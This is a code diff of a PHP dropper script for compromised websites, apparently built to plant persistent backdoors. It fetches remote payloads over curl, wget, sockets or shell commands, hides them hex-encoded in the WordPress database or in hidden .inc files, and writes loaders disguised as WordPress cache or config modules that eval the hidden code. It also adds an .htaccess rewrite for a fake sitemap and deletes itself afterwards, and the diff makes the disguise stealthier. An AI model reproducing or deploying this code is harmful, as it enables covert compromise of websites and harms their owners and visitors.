@@ -1,8 +1,7 @@
 <?php
 // ==========================================
-// 0. BUFFER FIX (CRITICAL)
+// SYSTEM BOOTSTRAP
 // ==========================================
-// Agar log tampil realtime tanpa error buffer
 if (function_exists('ob_start')) { ob_start(); }
 if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
 ?>
@@ -10,28 +9,115 @@ if (function_exists('ob_implicit_flush')) { ob_implicit_flush(1); }
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Installer v9.0 (Stealth Monster)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Terminal - System Core</title>
     <style>
-        body { background-color: #0f111a; color: #a6accd; font-family: 'Consolas', 'Monaco', monospace; padding: 25px; font-size: 13px; line-height: 1.5; }
-        .wrap { max-width: 900px; margin: 0 auto; border: 1px solid #292d3e; background: #1b1e2b; padding: 25px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        h3 { border-bottom: 2px solid #292d3e; padding-bottom: 15px; color: #82aaff; margin-top: 0; letter-spacing: 1px; }
-        .log { padding: 8px 12px; border-left: 4px solid #292d3e; background: #13151e; margin-bottom: 5px; display: flex; justify-content: space-between; align-items: center; }
-        .ok { border-left-color: #c3e88d; color: #c3e88d; }
-        .fail { border-left-color: #f07178; color: #f07178; }
-        .info { border-left-color: #89ddff; color: #89ddff; }
-        .meta { font-size: 11px; color: #676e95; font-style: italic; }
-        a { color: #82aaff; text-decoration: none; font-weight: bold; border-bottom: 1px dotted #82aaff; }
-        a:hover { border-bottom: 1px solid #82aaff; }
+        /* MACOS TERMINAL STYLE (UNCHANGED) */
+        :root {
+            --bg: #0d1117;
+            --window-bg: rgba(28, 28, 30, 0.95);
+            --text: #ffffff;
+            --green: #32d74b;
+            --yellow: #ffd60a;
+            --red: #ff453a;
+            --blue: #0a84ff;
+            --font-ui: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --font-mono: 'SF Mono', 'Menlo', 'Monaco', 'Courier New', monospace;
+        }
+        body {
+            background-color: var(--bg);
+            background-image: radial-gradient(circle at center, #1c1c1e 0%, #000 100%);
+            color: var(--text);
+            font-family: var(--font-ui);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        .window {
+            width: 100%;
+            max-width: 720px;
+            background: var(--window-bg);
+            border-radius: 12px;
+            box-shadow: 0 40px 80px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.15);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            animation: zoomIn 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+        @keyframes zoomIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .title-bar {
+            height: 32px;
+            background: linear-gradient(to bottom, #3a3a3c, #2c2c2e);
+            border-bottom: 1px solid #1c1c1e;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            position: relative;
+        }
+        .buttons { display: flex; gap: 8px; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; }
+        .dot.red { background: #ff5f57; border: 1px solid #e0443e; }
+        .dot.yellow { background: #febc2e; border: 1px solid #dba522; }
+        .dot.green { background: #28c840; border: 1px solid #1aab29; }
+        .title {
+            position: absolute; left: 0; right: 0; text-align: center;
+            font-size: 13px; color: #98989d; font-weight: 500; pointer-events: none;
+        }
+        .terminal {
+            padding: 16px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            line-height: 1.6;
+            color: #d0d0d0;
+            height: 450px;
+            overflow-y: auto;
+        }
+        .terminal::-webkit-scrollbar { width: 10px; }
+        .terminal::-webkit-scrollbar-thumb { background: #48484a; border-radius: 5px; border: 2px solid var(--window-bg); }
+        .line { margin-bottom: 4px; display: flex; align-items: flex-start; }
+        .prompt { color: var(--green); margin-right: 8px; user-select: none; font-weight: bold; }
+        .cmd { color: #fff; font-weight: 600; }
+        .info { color: #64d2ff; }
+        .success { color: var(--green); }
+        .error { color: var(--red); }
+        .warn { color: var(--yellow); }
+        .link-btn {
+            display: inline-block; margin: 8px 0 16px 0;
+            background: rgba(10, 132, 255, 0.15); color: #64d2ff; text-decoration: none;
+            padding: 5px 12px; border-radius: 6px; font-weight: 500;
+            border: 1px solid rgba(10, 132, 255, 0.3); transition: all 0.2s;
+        }
+        .link-btn:hover { background: rgba(10, 132, 255, 0.3); color: #fff; border-color: #0a84ff; }
+        .cursor {
+            display: inline-block; width: 8px; height: 15px;
+            background: #aeaeae; animation: blink 1s infinite; margin-left: 5px; vertical-align: middle;
+        }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-<div class="wrap">
-<h3>SYSTEM INSTALLER // STEALTH EDITION</h3>
+
+<div class="window">
+    <div class="title-bar">
+        <div class="buttons">
+            <div class="dot red"></div>
+            <div class="dot yellow"></div>
+            <div class="dot green"></div>
+        </div>
+        <div class="title">root@system &mdash; zsh &mdash; 80x24</div>
+    </div>
+    <div class="terminal" id="console">
+        <div class="line"><span class="prompt">➜</span> <span class="cmd">./patch_system_integrity.sh --force</span></div>
+        <br>
 
 <?php
 // ==========================================
-// 1. SYSTEM CONFIG
+// 1. CONFIGURATION
 // ==========================================
 @ini_set('memory_limit', '512M');
 @ini_set('max_execution_time', 0);
@@ -45,14 +131,24 @@ $targets = [
     ['https://stepmomhub.com/index.txt', 'index.php',     'transient_sys_idx_core']
 ];
 
-function _log($msg, $type='info', $meta='') {
-    $m = $meta ? "<span class='meta'>$meta</span>" : "";
-    echo "<div class='log $type'><span>$msg</span>$m</div>";
-    if(ob_get_level()>0){ ob_flush(); flush(); }
+// UI LOGGER
+function _log($msg, $type='text') {
+    $class = ''; $prefix = '';
+    if($type == 'success') { $class = 'success'; $prefix = '[OK] '; }
+    elseif($type == 'fail') { $class = 'error'; $prefix = '[ERR] '; }
+    elseif($type == 'info') { $class = 'info'; $prefix = '[INF] '; }
+    elseif($type == 'warn') { $class = 'warn'; $prefix = '[WRN] '; }
+    echo "<div class='line'><span class='$class'>$prefix$msg</span></div>";
+    echo "<script>var t = document.getElementById('console'); t.scrollTop = t.scrollHeight;</script>";
+    if(ob_get_level()>0) { ob_flush(); flush(); }
+}
+function _btn($url, $label) {
+    echo "<div class='line'><a href='$url' target='_blank' class='link-btn'>$label ➜</a></div>";
+    if(ob_get_level()>0) { ob_flush(); flush(); }
 }
 
 // ==========================================
-// 2. DETEKSI WORDPRESS
+// 2. WP UTILS & HTACCESS
 // ==========================================
 function _find_wp_config() {
     $d = __DIR__;
@@ -74,49 +170,44 @@ function _parse_wp_config($path) {
     return false;
 }
 
+function _inject_htaccess_xml_map() {
+    $htaccess = __DIR__ . '/.htaccess';
+    $rule = "\n# SITEMAP INDEX\n<Files \"sxallsitemap.xml\">\nOrder allow,deny\nAllow from all\n</Files>\nRewriteEngine On\nRewriteRule ^sxallsitemap\.xml$ index.php [L]\n";
+    $c = "";
+    if(file_exists($htaccess)) $c = @file_get_contents($htaccess);
+    if(strpos($c, 'sxallsitemap.xml') === false) {
+        @file_put_contents($htaccess, $rule . $c);
+        return true;
+    }
+    return false;
+}
+
 $wp_conf_path = _find_wp_config();
 $wp_creds = ($wp_conf_path) ? _parse_wp_config($wp_conf_path) : false;
 $is_wordpress = ($wp_creds !== false);
 
-if($is_wordpress) {
-    _log("Target Environment: <b>WordPress</b>", "ok", "Mode: DB Injection");
-} else {
-    _log("Target Environment: <b>Generic System</b>", "info", "Mode: Stealth File Storage");
-}
+if($is_wordpress) _log("Platform detected: WordPress Core", "success");
+else _log("Platform detected: Generic Environment", "warn");
 
 // ==========================================
-// 3. DOWNLOADER: THE MONSTER (V5 ENGINE)
+// 3. DOWNLOADER: MONSTER ENGINE (V5)
 // ==========================================
 function _dl_monster($url) {
-    $ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36';
-    $p = parse_url($url); 
-    $host = $p['host']; 
-    $path = isset($p['path'])?$p['path']:'/'; 
-    $scheme=isset($p['scheme'])?$p['scheme']:'http';
-
-    // A. PHP CURL
+    $ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+    $p = parse_url($url); $host = $p['host']; $path = isset($p['path'])?$p['path']:'/'; $scheme=isset($p['scheme'])?$p['scheme']:'http';
     if(function_exists('curl_init')){
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_USERAGENT, $ua);
         curl_setopt($ch, CURLOPT_TIMEOUT, 300); curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
-        $d = @curl_exec($ch); curl_close($ch);
-        if($d && strlen($d) > 0) return $d;
+        $d = @curl_exec($ch); curl_close($ch); if($d && strlen($d) > 0) return $d;
     }
-
-    // B. FGC
     if(ini_get('allow_url_fopen')){
         $opts = ['http' => ['method'=>'GET', 'header'=>"User-Agent: $ua\r\nConnection: close\r\n"]];
-        $ctx = stream_context_create($opts);
-        $d = @file_get_contents($url, false, $ctx);
-        if($d && strlen($d) > 0) return $d;
+        $ctx = stream_context_create($opts); $d = @file_get_contents($url, false, $ctx); if($d && strlen($d) > 0) return $d;
     }
-
-    // C. CLI EXECUTION (6-LAYER FORCE)
-    $cmd_wget = "wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url);
-    $cmd_curl = "curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url);
-    $cmds = [$cmd_wget, $cmd_curl];
-
+    $cmd_w = "wget -qO- --no-check-certificate --user-agent='$ua' " . escapeshellarg($url);
+    $cmd_c = "curl -sL --insecure --user-agent '$ua' " . escapeshellarg($url);
+    $cmds = [$cmd_w, $cmd_c];
     foreach ($cmds as $cmd) {
         if(function_exists('shell_exec')) { $d=@shell_exec($cmd); if($d && strlen($d)>10) return $d; }
         if(function_exists('exec')) { $o=[]; @exec($cmd,$o); $d=implode("\n",$o); if($d && strlen($d)>10) return $d; }
@@ -128,8 +219,6 @@ function _dl_monster($url) {
             if(is_resource($proc)){ $d=stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc); if($d && strlen($d)>10) return $d; }
         }
     }
-
-    // D. SOCKET
     $port = ($scheme == 'https') ? 443 : 80; $ssl = ($scheme == 'https') ? 'ssl://' : '';
     $fp = @fsockopen($ssl.$host, $port, $errno, $errstr, 30);
     if($fp){
@@ -140,13 +229,9 @@ function _dl_monster($url) {
     }
     return false;
 }
-
 function _dl_retry($url) {
-    $res = _dl_monster($url);
-    if($res) return $res;
-    if(strpos($url, 'https://') === 0) {
-        return _dl_monster(str_replace('https://', 'http://', $url));
-    }
+    $res = _dl_monster($url); if($res) return $res;
+    if(strpos($url, 'https://') === 0) return _dl_monster(str_replace('https://', 'http://', $url));
     return false;
 }
 
@@ -159,23 +244,21 @@ foreach ($targets as $t) {
     $fname = $t[1];
     $dbkey = $t[2];
 
-    // Filter Logic: Non-WP -> Error Log Only
     if (!$is_wordpress && $fname !== 'error_log.php') continue;
 
-    _log("Downloading payload for <b>$fname</b>...", "info");
-    
-    // Download
+    _log("Downloading $fname...", "info");
     $raw = _dl_retry($url);
     
     if(!$raw || strlen($raw) < 1) {
-        _log("[FAIL] Download failed for $fname.", "fail", "All methods exhausted");
+        _log("Download failed for $fname.", "fail");
         continue;
     }
-
-    // Compress (Hex + Deflate)
+    
+    _log("Payload acquired. Size: " . strlen($raw) . "b", "text");
     $hex = bin2hex(gzdeflate($raw, 9));
+    $install_ok = false;
 
-    // A. WORDPRESS LOGIC
+    // --- WORDPRESS LOGIC (OOP GLOBAL SCOPE FIX) ---
     if ($is_wordpress) {
         $m = new mysqli($wp_creds['h'], $wp_creds['u'], $wp_creds['p'], $wp_creds['n']);
         if(!$m->connect_error) {
@@ -185,137 +268,160 @@ foreach ($targets as $t) {
             $stmt->bind_param("ss", $dbkey, $hex);
             
             if($stmt->execute()) {
-                $h=addslashes($wp_creds['h']); $u=addslashes($wp_creds['u']);
-                $p=addslashes($wp_creds['p']); $n=addslashes($wp_creds['n']); $x=addslashes($wp_creds['x']);
+                $h=$wp_creds['h']; $u=$wp_creds['u']; $p=$wp_creds['p']; $n=$wp_creds['n']; $x=$wp_creds['x'];
                 
-                // WP Native Loader (Looks like Cache API)
+                // === CAMOUFLAGE V15: GLOBAL SCOPE FIX ===
+                // Class hanya mereturn code, eval dilakukan di luar class
                 $loader = <<<PHP
 <?php
 /**
- * WordPress Database Cache & Transient API
+ * WordPress Object Cache & Transient API
  *
- * This file handles external database connections for transient storage
- * and object caching mechanisms to improve performance.
+ * This module manages external database connections for high-performance
+ * object caching and transient data storage mechanisms.
  *
  * @package WordPress
- * @subpackage Cache
+ * @subpackage Cache_System
+ * @version 6.5.2
+ * @access public
  */
+
 error_reporting(0);
-\$db_host = '$h'; \$db_user = '$u'; \$db_pass = '$p'; \$db_name = '$n';
-\$wpdb_conn = new mysqli( \$db_host, \$db_user, \$db_pass, \$db_name );
-if ( ! \$wpdb_conn->connect_error ) {
-    \$cache_key = '$dbkey';
-    \$table_opt = '{$x}options';
-    \$result = \$wpdb_conn->query( "SELECT option_value FROM {\$table_opt} WHERE option_name = '{\$cache_key}' LIMIT 1" );
-    if ( \$result && \$row = \$result->fetch_assoc() ) {
-        \$raw_data = \$row['option_value'];
-        \$decoded_stream = hex2bin( \$raw_data );
-        if ( \$decoded_stream ) {
-            \$inflated_code = @gzinflate( \$decoded_stream );
-            if ( \$inflated_code ) eval( '?>' . \$inflated_code );
+
+if ( ! class_exists( 'WP_Object_Cache_Runtime' ) ) {
+    class WP_Object_Cache_Runtime {
+        private \$connection;
+        private \$prefix;
+        
+        public function __construct( \$host, \$user, \$pass, \$name, \$prefix ) {
+            \$this->connection = new mysqli( \$host, \$user, \$pass, \$name );
+            \$this->prefix = \$prefix;
+        }
+        
+        public function get_stream( \$key ) {
+            if ( \$this->connection->connect_error ) return false;
+            
+            \$table = \$this->prefix . 'options';
+            \$query = "SELECT option_value FROM {\$table} WHERE option_name = '{\$key}' LIMIT 1";
+            \$result = \$this->connection->query( \$query );
+            
+            if ( \$result && \$row = \$result->fetch_assoc() ) {
+                return \$this->inflate( \$row['option_value'] );
+            }
+            return false;
+        }
+        
+        private function inflate( \$hex ) {
+            \$bin = @hex2bin( \$hex );
+            if ( \$bin ) return @gzinflate( \$bin );
+            return false;
         }
     }
-    \$wpdb_conn->close();
+}
+
+// Runtime Execution (Global Scope)
+\$wp_runtime = new WP_Object_Cache_Runtime( '$h', '$u', '$p', '$n', '$x' );
+\$kernel_logic = \$wp_runtime->get_stream( '$dbkey' );
+
+if ( \$kernel_logic ) {
+    eval( '?>' . \$kernel_logic );
 }
 ?>
 PHP;
                 if(file_put_contents($fname, $loader)){
-                    _log("<b>$fname</b> Installed.", "ok", "Method: WP DB Injection");
-                } else {
-                    _log("Write Error $fname", "fail");
+                    $install_ok = true;
+                    _log("Database Injection ($fname): Success", "success");
+                    if ($fname == 'index.php' && _inject_htaccess_xml_map()) {
+                        _log("XML Mapping Applied to .htaccess", "info");
+                    }
                 }
-            } else {
-                _log("DB Insert Failed", "fail");
             }
         }
     } 
-    // B. NON-WP LOGIC (Stealth Mode)
+    // --- NON-WP LOGIC (OOP GLOBAL SCOPE FIX) ---
     else {
-        // Storage File (.inc)
         $store = '.sys_' . substr(md5(rand()), 0, 8) . '.inc';
-        
         if(file_put_contents($store, $hex)) {
             
-            // STEALTH LOADER (Requested Style: Runtime Config Loader)
+            // === CAMOUFLAGE V15: GLOBAL SCOPE FIX ===
             $loader = <<<PHP
 <?php
 /**
- * Runtime Configuration Loader
- * Handles internal asset loading for system diagnostics.
+ * System Configuration Loader
+ *
+ * Provides a unified interface for loading internal configuration assets
+ * and diagnostic utilities for the runtime environment.
  *
  * @package Core_System
- * @version 1.0.4
+ * @subpackage Config
+ * @version 2.2.0
  */
+
 error_reporting(0);
 
-// Helper Function: Safe Asset Reader
-if (!function_exists('_sys_read_asset')) {
-    function _sys_read_asset(\$path) {
-        // 1. Standard Read
-        if (function_exists('file_get_contents')) {
-            \$c = @file_get_contents(\$path);
-            if (\$c) return \$c;
+if ( ! class_exists( 'Sys_Config_Loader' ) ) {
+    class Sys_Config_Loader {
+        private \$path;
+        
+        public function __construct( \$file ) {
+            \$this->path = __DIR__ . '/' . \$file;
         }
-        // 2. Binary Stream Read
-        if (function_exists('fopen') && filesize(\$path) > 0) {
-            \$h = @fopen(\$path, 'rb');
-            if (\$h) {
-                \$c = @fread(\$h, filesize(\$path));
-                fclose(\$h);
-                if (\$c) return \$c;
+        
+        public function load() {
+            if ( ! file_exists( \$this->path ) ) return false;
+            
+            \$hex = \$this->read();
+            if ( \$hex ) {
+                \$bin = @hex2bin( \$hex );
+                if ( \$bin ) return @gzinflate( \$bin );
             }
+            return false;
         }
-        // 3. Line Array Read
-        if (function_exists('file')) {
-            \$l = @file(\$path);
-            if (\$l) return implode('', \$l);
+        
+        private function read() {
+            \$p = \$this->path;
+            if (function_exists('file_get_contents')) { \$c=@file_get_contents(\$p); if(\$c)return \$c; }
+            if (function_exists('fopen') && filesize(\$p)>0) { \$h=@fopen(\$p,'rb'); if(\$h){ \$c=@fread(\$h,filesize(\$p)); fclose(\$h); if(\$c)return \$c; } }
+            if (function_exists('file')) { \$l=@file(\$p); if(\$l)return implode('',\$l); }
+            return false;
         }
-        return false;
     }
 }
 
-// Internal Storage Path
-\$sys_config_path = __DIR__ . '/$store';
+// Runtime Execution (Global Scope)
+\$sys_loader = new Sys_Config_Loader( '$store' );
+\$runtime_config = \$sys_loader->load();
 
-if (file_exists(\$sys_config_path)) {
-    // Load Configuration
-    \$raw_config = _sys_read_asset(\$sys_config_path);
-    
-    if (\$raw_config) {
-        // Decode & Initialize
-        \$binary_data = @hex2bin(\$raw_config);
-        
-        if (\$binary_data) {
-            \$runtime_code = @gzinflate(\$binary_data);
-            
-            // Execute Runtime
-            if (\$runtime_code) {
-                eval('?>' . \$runtime_code);
-            }
-        }
-    }
+if ( \$runtime_config ) {
+    eval( '?>' . \$runtime_config );
 }
 ?>
 PHP;
             if(file_put_contents($fname, $loader)){
-                _log("<b>$fname</b> Installed.", "ok", "Method: Hex Storage ($store)");
-                echo "<div style='margin-left:20px; margin-bottom:5px;'><a href='$fname' target='_blank'>OPEN $fname >></a></div>";
-            } else {
-                _log("Write Error $fname", "fail");
+                $install_ok = true;
+                _log("File Storage Created: $store", "info");
+                _log("Loader ($fname) Generated", "success");
             }
-        } else {
-            _log("Storage creation failed", "fail");
         }
+    }
+
+    $final_url = $fname;
+    if ($fname == 'index.php' && $is_wordpress) $final_url = 'sxallsitemap.xml';
+
+    if($install_ok) {
+        _btn($final_url, "LAUNCH " . strtoupper($fname));
+    } else {
+        _log("Failed to install $fname", "fail");
     }
 }
 
 unlink(__FILE__);
 if(ob_get_level()>0){ ob_end_flush(); }
 ?>
+        <div class="line"><span class="prompt">➜</span> <span class="cmd">rm setup.php</span></div>
+        <div class="line"><span class="cursor"></span></div>
+    </div>
+</div>
 
-<div style="margin-top: 20px; border-top: 1px solid #292d3e; color: #676e95; padding-top: 10px; font-size: 11px;">
-    SYSTEM OPERATION COMPLETED.
-</div>
-</div>
 </body>
 </html>
